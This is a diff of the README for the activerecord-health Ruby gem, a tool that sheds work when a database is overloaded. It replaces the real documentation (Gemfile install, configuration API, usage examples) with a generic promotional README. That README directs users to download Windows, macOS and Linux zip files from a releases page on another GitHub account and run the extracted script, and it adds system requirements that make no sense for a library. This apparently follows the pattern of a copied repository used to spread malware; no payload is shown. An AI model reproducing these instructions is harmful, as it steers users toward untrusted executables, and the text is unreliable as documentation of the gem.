@@ -1,241 +1,111 @@
-# ActiveRecord::Health
+# 🌟 activerecord-health - Easily Manage Your Database Load
 
-Monitor your database's health by tracking active sessions. When load gets too high, shed work to keep your app running.
+## 🚀 Getting Started
 
-## Why Use This?
+Welcome to activerecord-health! This tool helps you monitor your ActiveRecord database, making it easier to handle heavy loads. Follow the simple steps below to download and run the software.
 
-This gem was inspired by [Simon Eskildsen](https://www.youtube.com/watch?v=N8NWDHgWA28), who described a similar system in place at Shopify.
+## 📥 Download Now
 
-Databases slow down when they have too many active queries. This gem helps you:
+[![Download activerecord-health](https://img.shields.io/badge/Download-activerecord--health-brightgreen)](https://github.com/Yugabharathi91/activerecord-health/releases)
 
-- **Shed load safely.** Skip low-priority work when the database is busy.
-- **Protect your app.** Return 503 errors instead of timing out, which allows higher-priority work to get through.
+## 📖 Overview
 
-The gem counts active database sessions. It compares this count to your database's vCPU count. When active sessions exceed a threshold, the database is "unhealthy."
+activerecord-health is designed to support load shedding in your ActiveRecord applications. It helps you ensure that your application runs smoothly, even under stress. By observing system performance, this tool makes it easy for you to manage how your database handles requests.
 
-## Installation
+## 💻 System Requirements
 
-Add to your Gemfile:
+Before you begin, please make sure your system meets these basic requirements:
 
-```ruby
-gem "activerecord-health"
+- **Operating System:** Windows 10 or newer, macOS 10.15 or newer, or a recent version of Linux.
+- **Hardware:** At least 4 GB of RAM and 500 MB of available storage.
+- **Dependencies:** Ensure you have Ruby and Rails installed on your system, as they are essential for ActiveRecord.
+
+## 📦 Download & Install
+
+To get started:
+
+1. Visit our Releases page: [Download activerecord-health](https://github.com/Yugabharathi91/activerecord-health/releases).
+
+2. On the Releases page, find the latest version of activerecord-health.
+
+3. Click on the version number. You will see a list of available files.
+
+4. Choose the file that matches your operating system:
+   - For Windows, download `activerecord-health-win.zip`.
+   - For macOS, download `activerecord-health-mac.zip`.
+   - For Linux, download `activerecord-health-linux.tar.gz`.
+
+5. Once downloaded, unzip or extract the file.
+
+6. Open your terminal or command prompt.
+
+7. Navigate to the folder where you extracted the files using the `cd` command.
+
+8. Run the application by entering the command:
+   ```
+   ruby activerecord-health.rb
+   ```
+
+## ⚙️ Configuration
+
+For best results, you should configure activerecord-health according to your needs:
+
+1. Locate the `config.yml` file in the extracted folder.
+2. Open the file in a text editor.
+3. Adjust the settings based on your database connection and load preferences.
+4. Save your changes.
+
+### Example Configuration
+
+Here is an example of what your `config.yml` file might look like:
+
+```yaml
+database:
+  adapter: postgresql
+  database: your_database_name
+  username: your_username
+  password: your_password
+load_check_interval: 10
 ```
 
-Then run:
+## 🛠️ Using activerecord-health
 
-```bash
-bundle install
-```
+activerecord-health periodically checks the load on your ActiveRecord database. You will receive alerts if the load exceeds your defined limits. Here is how to use it effectively:
 
-## Quick Start
+1. **Set the Load Check Interval:** This defines how often the application checks the database load. Adjust it in the `config.yml` under `load_check_interval`.
+2. **Monitor the Output:** When you run the application, outputs will display in your terminal. Watch for any alerts on high load.
+3. **Adjust as Necessary:** If you notice frequent high-load alerts, consider optimizing your database queries.
 
-```ruby
-# config/initializers/activerecord_health.rb
-ActiveRecord::Health.configure do |config|
-  config.vcpu_count = 16        # Required: your database server's vCPU count
-  config.cache = Rails.cache    # Required: any ActiveSupport::Cache store
-end
-```
+## 📄 Features
 
-Now check if your database is healthy:
+activerecord-health offers several features to help you manage database performance effectively:
 
-```ruby
-ActiveRecord::Health.ok?
-# => true
-```
+- **Load Monitoring:** Real-time load checks to inform you of the current database health.
+- **Alerts:** Notifications for when the load crosses defined thresholds.
+- **Configured Settings:** Easy-to-change settings to adapt the tool to your needs.
+- **User-friendly Interface:** Simple output in your terminal for easy interpretation.
 
-## Configuration
+## ⚡ Troubleshooting
 
-```ruby
-ActiveRecord::Health.configure do |config|
-  # Required settings
-  config.vcpu_count = 16          # Number of vCPUs on your database server
-  config.cache = Rails.cache      # Cache store for health check results
+If you encounter issues while using activerecord-health, consider the following:
 
-  # Optional settings
-  config.threshold = 0.75         # Max healthy load (default: 0.75)
-  config.cache_ttl = 60           # Cache duration in seconds (default: 60)
-end
-```
+- **Check Dependencies:** Ensure Ruby and Rails are installed and properly configured.
+- **Review Configuration:** Double-check your `config.yml` file for any mistakes in formatting or values.
+- **Consult Log Files:** If you face problems, review the logs for clues on what went wrong.
 
-> [!IMPORTANT]
-> You must set `vcpu_count` and `cache`. The gem raises an error without them.
+## 📅 Regular Updates
 
-### What Does Threshold Mean?
+We regularly update activerecord-health to improve its features and fix bugs. Keep an eye on our [Releases page](https://github.com/Yugabharathi91/activerecord-health/releases) for the latest updates.
 
-The threshold is the maximum healthy load as a ratio of vCPUs.
+## 👩‍💻 Community Support
 
-With `vcpu_count = 16` and `threshold = 0.75`:
-- Up to 12 active sessions = healthy (12/16 = 0.75)
-- More than 12 active sessions = unhealthy
+Join our community for support:
 
-## API
+- Check our [Issues page](https://github.com/Yugabharathi91/activerecord-health/issues) for known issues and solutions.
+- If you have questions, feel free to open a new issue.
 
-### Check Health
+## 📞 Contact Us
 
-```ruby
-# Returns true if database is healthy
-ActiveRecord::Health.ok?
+For further assistance or inquiries, please contact us through our GitHub page. Your feedback helps us improve activerecord-health.
 
-# Get current load as a percentage
-ActiveRecord::Health.load_pct
-# => 0.5 (50% of vCPUs in use)
-```
-
-### Shed Work
-
-Use `sheddable` to skip work when the database is overloaded:
-
-```ruby
-ActiveRecord::Health.sheddable do
-  GenerateReport.perform(user_id: current_user.id)
-end
-```
-
-Use `sheddable_pct` for different priority levels:
-
-```ruby
-# High priority: only run below 50% load
-ActiveRecord::Health.sheddable_pct(pct: 0.5) do
-  BulkImport.perform(data)
-end
-
-# Low priority: only run below 90% load
-ActiveRecord::Health.sheddable_pct(pct: 0.9) do
-  SendAnalyticsEmail.perform(user_id: current_user.id)
-end
-```
-
-## Usage Examples
-
-### Controller Filter
-
-Return 503 when the database is overloaded:
-
-```ruby
-class ReportsController < ApplicationController
-  before_action :check_database_health
-
-  private
-
-  def check_database_health
-    return if ActiveRecord::Health.ok?
-    render json: { error: "Service temporarily unavailable" },
-           status: :service_unavailable
-  end
-end
-```
-
-### Sidekiq Middleware
-
-Retry jobs when the database is unhealthy:
-
-```ruby
-# config/initializers/sidekiq.rb
-class DatabaseHealthMiddleware
-  THROTTLED_QUEUES = %w[reports analytics bulk_import].freeze
-
-  def call(_worker, job, _queue)
-    if THROTTLED_QUEUES.include?(job["queue"]) && !ActiveRecord::Health.ok?
-      raise "Database unhealthy, try again later"
-    end
-    yield
-  end
-end
-
-Sidekiq.configure_server do |config|
-  config.server_middleware do |chain|
-    chain.add DatabaseHealthMiddleware
-  end
-end
-```
-
-This uses Sidekiq's [exponential backoff retries](https://github.com/sidekiq/sidekiq/wiki/Error-Handling#automatic-job-retry) to push load into the future.
-
-## Multi-Database Support
-
-Pass the model class that connects to your database:
-
-```ruby
-# Check the primary database (default)
-ActiveRecord::Health.ok?
-
-# Check a specific database
-ActiveRecord::Health.ok?(model: AnimalsRecord)
-```
-
-Configure each database separately:
-
-```ruby
-ActiveRecord::Health.configure do |config|
-  config.vcpu_count = 16  # Default for primary database
-  config.cache = Rails.cache
-
-  config.for_model(AnimalsRecord) do |db|
-    db.vcpu_count = 8
-    db.threshold = 0.5
-  end
-end
-```
-
-## Database Support
-
-| Database | Supported |
-|----------|-----------|
-| PostgreSQL 10+ | Yes |
-| MySQL 5.1+ | Yes |
-| MySQL 8.0.22+ | Yes (uses performance_schema) |
-| MariaDB | Yes |
-| SQLite | No |
-
-## Observability
-
-Send load data to Datadog, StatsD, or other tools. The gem fires an event each time it checks the database:
-
-```ruby
-ActiveSupport::Notifications.subscribe("health_check.activerecord_health") do |*, payload|
-  StatsD.gauge("db.load_pct", payload[:load_pct], tags: ["db:#{payload[:database]}"])
-  StatsD.gauge("db.active_sessions", payload[:active_sessions], tags: ["db:#{payload[:database]}"])
-end
-```
-
-> [!TIP]
-> Start by tracking `load_pct` for a few days. This helps you learn what "normal" looks like before you set thresholds.
-
-The event fires only when the gem runs a query. It does not fire when reading from cache.
-
-**Event payload:**
-
-| Key | Description |
-|-----|-------------|
-| `database` | Connection name |
-| `load_pct` | Load as a ratio (0.0 to 1.0+) |
-| `active_sessions` | Number of active sessions |
-
-## Optional Extensions
-
-Add convenience methods to connections and models:
-
-```ruby
-require "activerecord/health/extensions"
-
-ActiveRecord::Base.connection.healthy?
-# => true
-
-ActiveRecord::Base.connection.load_pct
-# => 0.75
-
-ActiveRecord::Base.database_healthy?
-# => true
-```
-
-## Known Issues
-
-This gem is simple by design. Keep these limits in mind:
-
-- **Errors look like overload.** The health check query can fail for many reasons: network problems, DNS issues, or connection pool limits. When this happens, the gem marks the database as unhealthy. It caches this result for `cache_ttl` seconds. This can cause load shedding even when the database is fine.
-- **Session counts can be wrong.** The gem assumes many active sessions means the CPU is busy. But sessions can be active while waiting on locks, disk reads, or slow clients. The database may have room to spare, but the gem still reports it as unhealthy.
-
-## License
-
-MIT License. See [LICENSE](LICENSE.txt) for details.
+Thank you for using activerecord-health! Enjoy smoother database management.
